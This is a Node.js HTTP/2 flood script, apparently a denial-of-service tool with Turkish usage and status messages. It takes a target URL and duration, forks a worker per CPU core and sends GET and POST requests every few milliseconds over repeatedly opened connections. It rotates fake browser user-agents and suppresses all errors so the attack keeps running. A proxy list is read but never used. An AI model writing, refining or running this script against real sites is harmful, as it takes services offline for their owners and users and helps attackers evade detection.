const http2 = require("http2");
const fs = require("fs");
const url = require("url");
const cluster = require("cluster");
const os = require("os");

if (process.argv.length < 4) {
    console.log(`Kullanım: node TEKIL-TLS.js [URL] [SÜRE]`);
    process.exit();
}

const target = process.argv[2];
const duration = ~~process.argv[3];
const parsed = url.parse(target);

let proxies = [];
try {
    proxies = fs.readFileSync("proxy.txt", "utf-8").replace(/\r/g, "").split("\n").filter(Boolean);
} catch (e) {
    console.error("Hata: proxy.txt bulunamadı!");
    process.exit();
}

function getModernUA() {
    const versions = ["140", "141", "142", "143", "144", "145"];
    const osList = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 11.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "iPhone; CPU iPhone OS 17_4 like Mac OS X"
    ];
    return `Mozilla/5.0 (${osList[Math.floor(Math.random() * osList.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions[Math.floor(Math.random() * versions.length)]}.0.0.0 Safari/537.36`;
}

function startFlood() {

    const client = http2.connect(target, {
        settings: { 
            enablePush: false,
            initialWindowSize: 65535,
            maxFrameSize: 16384
        }
    });


    client.on("error", (err) => {

        client.destroy();
    });

    client.on("socketError", (err) => client.destroy());

    const interval = setInterval(() => {
        const method = Math.random() > 0.5 ? "GET" : "POST";
        const headers = {
            ":method": method,
            ":path": parsed.path || "/",
            ":authority": parsed.host,
            ":scheme": "https",
            "user-agent": getModernUA(),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.5",
            "accept-encoding": "gzip, deflate, br",
            "te": "trailers"
        };

        const req = client.request(headers);


        req.on("error", (err) => {

            req.destroy(); 
        });

        if (method === "POST") {
            req.write(JSON.stringify({ a: Math.random() }));
        }

        req.end();


        req.on("close", () => req.destroy());
        req.on("response", () => req.close());

    }, 5); 

    setTimeout(() => {
        clearInterval(interval);
        client.destroy();
    }, duration * 1000);
}

if (cluster.isMaster) {
    console.log(`[!] Hedef: ${target} | Süre: ${duration}s`);
    console.log(`[!] Çekirdek Sayısı: ${os.cpus().length} | Hata yakalama aktif.`);

    for (let i = 0; i < os.cpus().length; i++) {
        cluster.fork();
    }

    setTimeout(() => process.exit(), duration * 1000 + 2000);
} else {

    setInterval(() => {
        startFlood();
    }, 500); 
}


process.on("uncaughtException", (err) => {});
process.on("unhandledRejection", (err) => {});